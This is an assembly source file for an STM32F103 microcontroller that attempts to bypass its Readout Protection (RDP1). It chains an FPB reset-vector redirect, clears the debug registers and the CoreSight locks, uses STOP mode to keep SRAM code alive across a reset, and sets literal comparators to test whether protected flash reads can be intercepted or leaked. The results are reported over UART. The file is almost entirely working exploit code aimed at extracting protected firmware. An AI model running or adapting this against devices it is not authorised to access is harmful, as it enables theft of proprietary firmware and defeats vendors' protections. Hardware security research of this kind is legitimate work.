/*
 * STM32F103 RDP1 Bypass — FPB Literal Comparator Experiment
 *
 * Explores whether FPB literal comparators can intercept flash data reads
 * without faulting under RDP1, and whether any path to actual flash content
 * exists through this mechanism.
 *
 * FP_CTRL on our F103: 0x261 → NUM_CODE=6, NUM_LIT=2
 *   COMP0-5: code comparators (instruction fetch remap)
 *   COMP6-7: literal comparators (data read remap)
 *   Remap table: base 0x20000020, entries [0]-[7]
 *     COMP6 → remap[6] = 0x20000038
 *     COMP7 → remap[7] = 0x2000003C
 *
 * Stage 1 (SRAM, run via SWD):
 *   - Configure FPB: COMP0 for reset vector redirect, COMP6/7 for literal test
 *   - STOP debug kill (clear C_DEBUGEN)
 *   - UART report, wait for nRST
 *
 * Stage 2 (flash boot via FPB redirect):
 *   - Test 1: Read flash addr WITHOUT literal comparator → expect FAULT
 *   - Test 2: Read flash addr WITH literal comparator → expect remap data (no fault?)
 *   - Test 3: Read flash addr with literal comp, check if flash data leaks
 *   - Report results via UART
 */
.syntax unified
.thumb
.cpu cortex-m3

.section .text

/* ========== Vector table (0x20000000) ========== */
.word 0x20005000          /* Initial SP */
.word nop_sled + 1        /* Reset vector */

/* NOP sled: 0x20000008 through 0x200001FF */
nop_sled:
.rept 252
    nop
.endr

/* ========== STAGE 1: FPB + STOP debug kill ========== */
stage1_start:   /* 0x20000200 */
    /* Enable GPIOA clock */
    ldr r0, =0x40021018    /* RCC_APB2ENR */
    ldr r1, [r0]
    orrs r1, r1, #4
    str r1, [r0]
    movs r2, #100
1:  subs r2, #1
    bne 1b

    /* PA5 push-pull output (LED) */
    ldr r0, =0x40010800    /* GPIOA_CRL */
    ldr r1, [r0]
    bic r1, r1, #0x00F00000
    orr r1, r1, #0x00200000
    str r1, [r0]

    /* LED on */
    ldr r4, =0x40010810    /* GPIOA_BSRR */
    movs r0, #32
    str r0, [r4]

    /* Write stage 2 thumb address to remap[0] at 0x20000020 */
    ldr r0, =stage2_start + 1
    ldr r1, =0x20000020
    str r0, [r1]

    /* Write known sentinel values to remap[6] and remap[7]
     * These will be returned by literal comparators instead of flash data */
    ldr r0, =0xDEAD0006    /* Sentinel for COMP6 */
    ldr r1, =0x20000038    /* remap[6] */
    str r0, [r1]
    ldr r0, =0xDEAD0007    /* Sentinel for COMP7 */
    ldr r1, =0x2000003C    /* remap[7] */
    str r0, [r1]

    /* Configure FPB */
    ldr r0, =0xE0002000    /* FPB base */
    movs r1, #3             /* FP_CTRL: ENABLE + KEY */
    str r1, [r0, #0]
    movs r1, #0x20          /* FP_REMAP: base 0x20000020 */
    str r1, [r0, #4]
    /* COMP0: reset vector redirect (addr 0x04, REPLACE=00, ENABLE) */
    movs r1, #0x05
    str r1, [r0, #8]
    /* COMP6 (0xE0002018): literal comp, match 0x08000000 */
    ldr r1, =0x08000001    /* addr 0x08000000 | ENABLE */
    str r1, [r0, #0x18]    /* FP_COMP6 */
    /* COMP7 (0xE000201C): literal comp, match 0x08000004 */
    ldr r1, =0x08000005    /* addr 0x08000004 | ENABLE */
    str r1, [r0, #0x1C]    /* FP_COMP7 */

    /* ---- Aggressively clear debug state ---- */

    /* Clear C_DEBUGEN via DHCSR */
    ldr r0, =0xE000EDF0
    ldr r1, =0xA05F0000
    str r1, [r0]

    /* Clear DEMCR */
    ldr r0, =0xE000EDFC
    movs r1, #0
    str r1, [r0]

    /* Clear DBGMCU_CR */
    ldr r0, =0xE0042004
    movs r1, #0
    str r1, [r0]

    /* Disable DWT */
    ldr r0, =0xE0001000
    movs r1, #0
    str r1, [r0]

    /* Lock CoreSight (not FPB!) */
    ldr r0, =0xE0000FB0    /* ITM_LAR */
    movs r1, #0
    str r1, [r0]
    ldr r0, =0xE0001FB0    /* DWT_LAR */
    str r1, [r0]
    ldr r0, =0xE0040FB0    /* TPIU_LAR */
    str r1, [r0]

    /* ---- Enter STOP mode ---- */

    /* Enable PWR and BKP clocks */
    ldr r0, =0x4002101C    /* RCC_APB1ENR */
    ldr r1, [r0]
    orr r1, r1, #0x18000000
    str r1, [r0]
    movs r2, #10
2:  subs r2, #1
    bne 2b

    /* Enable backup domain write access */
    ldr r0, =0x40007000    /* PWR_CR */
    ldr r1, [r0]
    orr r1, r1, #0x100
    str r1, [r0]

    /* Enable LSI */
    ldr r0, =0x40021024    /* RCC_CSR */
    ldr r1, [r0]
    orr r1, r1, #1
    str r1, [r0]
3:  ldr r1, [r0]
    tst r1, #2
    beq 3b

    /* Select LSI as RTC clock, enable RTC */
    ldr r0, =0x40021020    /* RCC_BDCR */
    ldr r1, [r0]
    bic r1, r1, #0x300
    orr r1, r1, #0x200     /* RTCSEL = LSI */
    str r1, [r0]
    orr r1, r1, #0x8000    /* RTCEN */
    str r1, [r0]

    /* Wait RSF */
    ldr r0, =0x40002804    /* RTC_CRL */
4:  ldr r1, [r0]
    tst r1, #8
    beq 4b

    /* Enter config mode */
5:  ldr r1, [r0]
    tst r1, #0x20
    beq 5b
    ldr r1, [r0]
    orr r1, r1, #0x10
    str r1, [r0]

    /* No prescaler */
    ldr r0, =0x40002808
    movs r1, #0
    str r1, [r0]
    ldr r0, =0x4000280C
    str r1, [r0]

    /* Alarm = cnt + 80 (~2ms) */
    ldr r0, =0x40002818    /* RTC_CNTH */
    ldr r1, [r0]
    ldr r0, =0x4000281C    /* RTC_CNTL */
    ldr r2, [r0]
    orr r2, r2, r1, lsl #16
    adds r2, r2, #80

    ldr r0, =0x40002820    /* RTC_ALRH */
    lsrs r1, r2, #16
    str r1, [r0]
    ldr r0, =0x40002824    /* RTC_ALRL */
    uxth r1, r2
    str r1, [r0]

    /* Exit config, wait RTOFF */
    ldr r0, =0x40002804
    ldr r1, [r0]
    bic r1, r1, #0x10
    str r1, [r0]
6:  ldr r1, [r0]
    tst r1, #0x20
    beq 6b

    /* Enable RTC alarm interrupt + EXTI 17 */
    ldr r0, =0x40002800
    ldr r1, [r0]
    orr r1, r1, #2
    str r1, [r0]
    ldr r0, =0x40010400    /* EXTI_IMR */
    ldr r1, [r0]
    orr r1, r1, #0x20000
    str r1, [r0]
    ldr r0, =0x40010404    /* EXTI_EMR */
    ldr r1, [r0]
    orr r1, r1, #0x20000
    str r1, [r0]
    ldr r0, =0x40010408    /* EXTI_RTSR */
    ldr r1, [r0]
    orr r1, r1, #0x20000
    str r1, [r0]

    /* PWR_CR.PDDS=0, SCB_SCR SEVONPEND|SLEEPDEEP */
    ldr r0, =0x40007000
    ldr r1, [r0]
    bic r1, r1, #2
    str r1, [r0]
    ldr r0, =0xE000ED10
    ldr r1, [r0]
    orr r1, r1, #0x14
    str r1, [r0]

    dsb
    wfe

    /* Woken — clear sleep bits */
    ldr r0, =0xE000ED10
    ldr r1, [r0]
    bic r1, r1, #0x14
    str r1, [r0]

    /* UART report: "S1:X\n" where X = C_DEBUGEN */
    ldr r0, =0x40021018    /* RCC_APB2ENR */
    ldr r1, [r0]
    orr r1, r1, #4
    orr r1, r1, #0x4000
    str r1, [r0]
    ldr r2, =5000
7:  subs r2, #1
    bne 7b

    /* PA9 AF push-pull */
    ldr r0, =0x40010804
    ldr r1, [r0]
    bic r1, r1, #0xF0
    orr r1, r1, #0xA0
    str r1, [r0]

    /* USART1: 115200 @ 8MHz */
    ldr r0, =0x40013808
    movs r1, #0x45
    str r1, [r0]
    ldr r0, =0x4001380C
    movw r1, #0x2008
    str r1, [r0]
    movs r2, #200
8:  subs r2, #1
    bne 8b

    /* Read C_DEBUGEN */
    ldr r0, =0xE000EDF0
    ldr r1, [r0]
    and r5, r1, #1

    /* Send "S1:X\n" */
    ldr r4, =0x40013800
    movs r0, #0x53
    bl uart_send_byte
    movs r0, #0x31
    bl uart_send_byte
    movs r0, #0x3A
    bl uart_send_byte
    adds r0, r5, #0x30
    bl uart_send_byte
    movs r0, #0x0A
    bl uart_send_byte

stage1_wait:
    b stage1_wait


/* ========== STAGE 2: Literal Comparator Tests ========== */
.align 2
stage2_start:
    ldr sp, =0x20005000

    /* Re-enable clocks */
    ldr r0, =0x40021018
    ldr r1, [r0]
    orrs r1, r1, #4
    orr r1, r1, #0x4000
    str r1, [r0]
    ldr r2, =50000
1:  subs r2, #1
    bne 1b

    /* PA5 LED output + on */
    ldr r0, =0x40010800
    ldr r1, [r0]
    bic r1, r1, #0x00F00000
    orr r1, r1, #0x00200000
    str r1, [r0]
    ldr r0, =0x40010810
    movs r1, #32
    str r1, [r0]

    /* PA9 AF push-pull for USART1 TX */
    ldr r0, =0x40010804
    ldr r1, [r0]
    bic r1, r1, #0xF0
    orr r1, r1, #0xA0
    str r1, [r0]

    /* USART1: 115200 @ 8MHz */
    ldr r0, =0x40013808
    movs r1, #0x45
    str r1, [r0]
    ldr r0, =0x4001380C
    movw r1, #0x2008
    str r1, [r0]
    movs r2, #200
2:  subs r2, #1
    bne 2b

    ldr r4, =0x40013800    /* USART1 base — keep in r4 for all sends */

    /* Set up hardfault handler in SRAM */
    ldr r6, =0x20004F00
    ldr r0, =0x20005000
    str r0, [r6, #0]           /* SP */
    ldr r0, =hardfault_handler + 1
    str r0, [r6, #0x0C]        /* HardFault vector */
    ldr r0, =0xE000ED08
    str r6, [r0]                /* VTOR = SRAM table */

    /* --- Send header "LIT1" --- */
    movs r0, #0x4C     /* 'L' */
    bl uart_send_byte
    movs r0, #0x49     /* 'I' */
    bl uart_send_byte
    movs r0, #0x54     /* 'T' */
    bl uart_send_byte
    movs r0, #0x31     /* '1' */
    bl uart_send_byte

    /* --- Send DHCSR (4 bytes) --- */
    ldr r5, =0xE000EDF0
    ldr r3, [r5]
    bl send_word

    /* --- Send FP_CTRL (4 bytes) --- */
    ldr r5, =0xE0002000
    ldr r3, [r5]
    bl send_word

    /* --- Send FP_COMP6 (4 bytes) — verify literal comp is set --- */
    ldr r5, =0xE0002018
    ldr r3, [r5]
    bl send_word

    /* --- Send FP_COMP7 (4 bytes) --- */
    ldr r5, =0xE000201C
    ldr r3, [r5]
    bl send_word

    /* --- Test: read 0x08000000 (COMP6 should intercept) --- */
    /* If literal comp works, we get 0xDEAD0006 (remap sentinel) */
    /* If it doesn't intercept, we get FAULT (RDP1 blocks flash read) */
    ldr r5, =0x08000000
    ldr r3, [r5]            /* This is the critical read */
    bl send_word             /* Send whatever we got */

    /* --- Test: read 0x08000004 (COMP7 should intercept) --- */
    ldr r5, =0x08000004
    ldr r3, [r5]
    bl send_word

    /* --- Test: read 0x08000008 (NO comparator — should FAULT) --- */
    ldr r5, =0x08000008
    ldr r3, [r5]
    bl send_word

    /* If we got here, all reads succeeded — send "DONE" */
    movs r0, #0x44     /* 'D' */
    bl uart_send_byte
    movs r0, #0x4F     /* 'O' */
    bl uart_send_byte
    movs r0, #0x4E     /* 'N' */
    bl uart_send_byte
    movs r0, #0x45     /* 'E' */
    bl uart_send_byte

3:  b 3b


/* HardFault handler: send "FLT!" + stacked PC, then spin */
hardfault_handler:
    ldr r4, =0x40013800
    movs r0, #0x46     /* 'F' */
    bl uart_send_byte
    movs r0, #0x4C     /* 'L' */
    bl uart_send_byte
    movs r0, #0x54     /* 'T' */
    bl uart_send_byte
    movs r0, #0x21     /* '!' */
    bl uart_send_byte
    /* Send stacked PC (offset 24 from SP on exception entry) */
    mrs r0, msp
    ldr r3, [r0, #24]  /* Stacked PC */
    bl send_word
4:  b 4b


/* ========== Send word in r3 (4 bytes LE) ========== */
send_word:
    push {lr}
    movs r0, r3
    and r0, r0, #0xFF
    bl uart_send_byte
    lsrs r0, r3, #8
    and r0, r0, #0xFF
    bl uart_send_byte
    lsrs r0, r3, #16
    and r0, r0, #0xFF
    bl uart_send_byte
    lsrs r0, r3, #24
    bl uart_send_byte
    pop {pc}

/* ========== UART send byte in r0 via USART1 (r4=base) ========== */
uart_send_byte:
    ldr r1, [r4, #0]       /* USART1_SR */
    tst r1, #0x80           /* TXE */
    beq uart_send_byte
    str r0, [r4, #4]       /* USART1_DR */
    bx lr
